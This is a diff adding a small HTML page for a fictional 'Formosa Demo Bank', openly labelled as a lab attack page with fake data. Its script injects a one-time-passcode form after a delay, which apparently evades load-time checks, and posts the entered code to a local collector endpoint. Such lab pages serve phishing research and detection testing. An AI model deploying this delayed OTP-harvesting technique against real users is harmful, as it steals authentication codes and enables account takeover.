@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Formosa Demo Bank - Verify</title></head>
+<body>
+  <h1>Formosa Demo Bank</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - OTP form appears after a delay. Fake data only.</p>
+  <div id="slot"><p>Loading your secure session...</p></div>
+
+  <script>
+    // Harmless at load. After a delay, inject an OTP form that exfiltrates.
+    setTimeout(() => {
+      document.getElementById("slot").innerHTML =
+        '<input autocomplete="one-time-code" placeholder="SMS code">' +
+        '<button type="button" id="verify">Verify</button>';
+      document.getElementById("verify").addEventListener("click", () => {
+        const code = document.querySelector('input[autocomplete="one-time-code"]').value;
+        fetch("http://127.0.0.1:8002/collect", {
+          method: "POST",
+          headers: {"Content-Type": "application/x-www-form-urlencoded"},
+          body: "otp=" + encodeURIComponent(code),
+        });
+      });
+    }, 2500);
+  </script>
+</body></html>
